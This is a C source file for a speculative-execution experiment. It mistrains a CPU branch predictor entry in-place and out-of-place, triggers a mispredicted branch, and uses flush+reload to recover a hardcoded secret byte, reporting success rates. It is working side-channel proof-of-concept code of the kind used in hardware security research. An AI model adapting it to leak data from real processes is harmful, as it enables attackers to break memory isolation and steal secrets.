#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#include "x86-64.h"
#include "flush-reload.h"

/* ----------------------------- Experiment ----------------------------------*/
#define EXPERIMENT "pht3b-spec-training"
/* ---------------------------------------------------------------------------*/

/* BPU. */
#define PHT_ALIAS_OFFSET (1 << 19) // Skylake
#define HS_S 100
#define PRIME_T 0
#define PRIME_N 1

#define SPEC_FALSE 0.0f
#define SPEC_TRUE  1.0f

/* Repetitions to calculate effectiveness. */
#define REPETITIONS 1000

/* Secret to recover. */
#define SECRET 'A'

uint8_t *cache_mem;

void hs_function()
{
  asm volatile(
    ".Lloop_start:\n\t"
    "loop .Lloop_start"
    :: "c" (HS_S) :
  );
}

__attribute__((aligned(PHT_ALIAS_OFFSET)))
void pht3b_branch_spec(float bd)
{
  // Extend Speculative Execution
  _CLFLUSH(&bd);
  _MFENCE;
  // History Saturation
  hs_function();
  // true (1.0) -> Taken, false (0.0) -> Non-Taken
  if ((bd / 2.0) > 0.25)
    _MACCESS(cache_mem + SECRET * FR_PAGESIZE);
}

__attribute__((aligned(PHT_ALIAS_OFFSET)))
void pht3b_branch_oop(float bd)
{
  // Extend Speculative Execution
  _CLFLUSH(&bd);
  _MFENCE;
  // Disable g-share mechanism
  hs_function();
  // true (1.0) -> Taken, false (0.0) -> Non-Taken
  if ((bd / 2.0) > 0.25)
    _1BYTE_NOP;
}

int main()
{
  int score[2] = {};
  char recover;
  cache_mem = (uint8_t *) fr_mem_allocate_pages();
  fr_thr_calibrate();
  // Training In-place
  for (int r = 0; r < REPETITIONS; r++) {
    // Mis-train the PHT entry
    pht3b_branch_spec(SPEC_TRUE); // 1
    pht3b_branch_spec(SPEC_TRUE); // 2
    pht3b_branch_spec(SPEC_TRUE); // 3
    pht3b_branch_spec(SPEC_TRUE); // 4
    pht3b_branch_spec(SPEC_TRUE); // 5
    pht3b_branch_spec(SPEC_TRUE); // 6
    pht3b_branch_spec(SPEC_TRUE); // 7
    // Flush
    fr_flush_pages();
    // Speculative Execution
    pht3b_branch_spec(SPEC_FALSE);
    // Reload
    recover = (char) fr_reload_decode_pages();
    // Check
    if (recover == SECRET)
      score[0]++;
  }
  // Training Out-of-place
  for (int r = 0; r < REPETITIONS; r++) {
    // Mis-train the PHT entry
    pht3b_branch_oop(SPEC_TRUE); // 1
    pht3b_branch_oop(SPEC_TRUE); // 2
    pht3b_branch_oop(SPEC_TRUE); // 3
    pht3b_branch_oop(SPEC_TRUE); // 4
    pht3b_branch_oop(SPEC_TRUE); // 5
    pht3b_branch_oop(SPEC_TRUE); // 6
    pht3b_branch_oop(SPEC_TRUE); // 7
    // Flush
    fr_flush_pages();
    // Speculative Execution
    pht3b_branch_spec(SPEC_FALSE);
    // Reload
    recover = (char) fr_reload_decode_pages();
    // Check
    if (recover == SECRET)
      score[1]++;
  }
  printf("Speculation Trigger Rate\n");
  printf("--------------------------\n");
  printf("In-place        | %1.3f\n", (float) score[0] / REPETITIONS);
  printf("Out-of-Place    | %1.3f\n", (float) score[1] / REPETITIONS);
  printf("--------------------------\n");
  fr_mem_free();
  fr_thr_report();
}
